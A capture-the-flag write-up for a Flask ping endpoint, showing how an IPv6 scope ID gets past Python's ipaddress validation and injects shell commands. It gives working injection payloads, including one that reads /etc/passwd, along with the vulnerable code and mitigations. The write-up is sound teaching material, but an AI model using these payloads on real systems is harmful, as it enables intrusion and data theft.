# 💉 EZ Command Injection

## Description

ez command injection chall

## Initial Analysis

### Technology Background

#### IPv6 Address Format
IPv6 addresses consist of eight groups of four hexadecimal digits separated by colons, representing 128 bits total. The format supports compression where consecutive zero groups can be abbreviated using `::`.

**Example**: `0000:0000:0000:0000:0000:0abc:007:0def` → `::abc:7:def`

#### IPv6 Scope ID Concept
Link-local IPv6 addresses (`fe80::/10`) are only valid within a specific network segment. To distinguish between interfaces, IPv6 uses scope identifiers appended with the `%` symbol.

**Usage Example**:
```bash
ping6 fe80::1%eth0
```

Where:
- `fe80::1` is the IPv6 address
- `%eth0` specifies the network interface scope

Network interfaces can be identified using `ip addr`:
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:1a:2b:3c:4d:5e brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::1a2b:3c4d:5e6f/64 scope link 
       valid_lft forever preferred_lft forever
```

## Code Analysis

### Endpoint: `/ping`

```python
import ipaddress
import subprocess
from flask import Flask, request, render_template

@app.route('/ping', methods=['GET'])
def ping():
    # Extract host parameter from URL query string
    host = request.args.get('host', '')
    
    try:
        # Validate IP address format using ipaddress library
        addr = ipaddress.ip_address(host)
    except ValueError:
        error_msg = 'Invalid IP address'
        print(error_msg)
        return render_template('index.html', result=error_msg)

    # Construct ping command with user input
    cmd = f'ping -c 3 {addr}'
    
    try:
        # Execute command through shell
        output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=8)
        return render_template('index.html', result=output.decode('utf-8'))
    except subprocess.TimeoutExpired:
        error_msg = 'Timeout!!!!'
        print(error_msg)
        return render_template('index.html', result=error_msg)
    except subprocess.CalledProcessError:
        error_msg = 'An error occurred while executing the command'
        print(error_msg)
        return render_template('index.html', result=error_msg)
```

### Input Validation Analysis

The application uses Python's `ipaddress.ip_address()` function for input validation:

1. **IPv4/IPv6 Detection**: Automatically determines address type
2. **Format Validation**: Ensures proper IP address structure
3. **Error Handling**: Returns "Invalid IP address" for malformed input

### Command Execution Flow

1. **Input Processing**: Extract `host` parameter from URL
2. **Validation**: Verify IP address format using `ipaddress` library
3. **Command Construction**: Build ping command string with user input
4. **Shell Execution**: Execute command via `/bin/sh -c`
5. **Output Return**: Display command results to user

## Vulnerability Analysis

### Command Injection Flaw

The critical vulnerability exists in the command construction and execution logic:

```python
cmd = f'ping -c 3 {addr}'
output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=8)
```

**Vulnerable Pattern**: Direct string interpolation with shell execution  
**Secure Alternative**: Using argument arrays would prevent shell interpretation:
```python
# Secure approach (not used)
subprocess.check_output(['ping', '-c', '3', str(addr)])
```

### IPv6 Scope ID Exploitation

#### Why IPv6 Over IPv4?

IPv4 addresses lack scope identifier syntax, making command injection impossible through address format alone. IPv6's scope ID mechanism provides the necessary injection vector.

#### Scope ID Parsing Logic

Python's `ipaddress` library processes IPv6 scope IDs using partition logic:
```python
addr, sep, scope_id = ipv6_address.partition('%')
```

Where:
- `addr`: IPv6 address portion before `%`
- `sep`: The `%` separator character
- `scope_id`: Everything after `%` (scope identifier)

**Critical Issue**: The `scope_id` portion accepts arbitrary characters without validation, enabling command injection.

### Exploitation Methodology

#### Step 1: Payload Structure
```
IPv6_ADDRESS%SCOPE_ID;MALICIOUS_COMMAND
```

**Components**:
- `IPv6_ADDRESS`: Valid IPv6 format (e.g., `fe80::1234`)
- `%`: Scope ID separator
- `SCOPE_ID`: Valid scope identifier
- `;`: Shell command separator
- `MALICIOUS_COMMAND`: Injected command

#### Step 2: Command Injection Vector
The final command becomes:
```bash
ping -c 3 fe80::1234%eth0;cat /etc/passwd
```

Which executes as two separate commands:
1. `ping -c 3 fe80::1234%eth0`
2. `cat /etc/passwd`

## Exploitation

### Step 1: Directory Reconnaissance

**Payload**:
```
/ping?host=fe80::1234%;ls
```

**Explanation**:
- `fe80::1234`: Valid IPv6 link-local address
- `%`: Scope ID separator
- `;ls`: Command injection payload

### Step 2: Flag Extraction

**Payload**:
```
/ping?host=fe80::1234%;cat%20flag.txt
```

**URL Encoding**: Space character encoded as `%20` for proper URL formatting

## Security Implications

### Root Cause Analysis

1. **Insufficient Input Sanitization**: While IP format validation exists, scope ID content remains unvalidated
2. **Shell Execution Pattern**: Using shell interpretation instead of direct command execution
3. **String Interpolation**: Direct concatenation of user input into command strings

### Attack Surface

This vulnerability class affects applications that:
- Process IPv6 addresses with scope identifiers
- Execute system commands with user-controlled input
- Rely solely on IP address format validation
- Use shell interpretation for command execution

### Mitigation Strategies

#### Secure Code Patterns

**1. Argument Array Execution**:
```python
# Secure approach
subprocess.check_output(['ping', '-c', '3', str(addr)])
```

**2. Input Sanitization**:
```python
import re

def validate_scope_id(scope_id):
    # Allow only alphanumeric characters and common interface names
    pattern = r'^[a-zA-Z0-9]+$'
    return re.match(pattern, scope_id) is not None
```

**3. Command Whitelisting**:
```python
ALLOWED_COMMANDS = ['ping', 'traceroute']
ALLOWED_OPTIONS = ['-c', '-w']

def build_safe_command(command, options, target):
    if command not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")
    # Build command safely
```

## Key Learning Points

### Technical Concepts

1. **IPv6 Scope ID Mechanism**: Understanding link-local addressing and interface specification
2. **Command Injection Vectors**: Exploiting shell metacharacters in system command execution
3. **Input Validation Gaps**: Recognizing partial validation that misses injection opportunities

### Security Principles

1. **Defense in Depth**: Multiple validation layers prevent single-point failures
2. **Principle of Least Privilege**: Avoid shell interpretation when direct execution suffices
3. **Input Sanitization**: Validate all user-controlled data, not just primary input fields

### Practical Applications

This vulnerability pattern commonly appears in:
- Network diagnostic tools
- System administration interfaces
- IoT device management platforms
- Network monitoring applications

Understanding IPv6 scope ID exploitation provides valuable insight into modern network protocol security considerations and the importance of comprehensive input validation in system command interfaces.
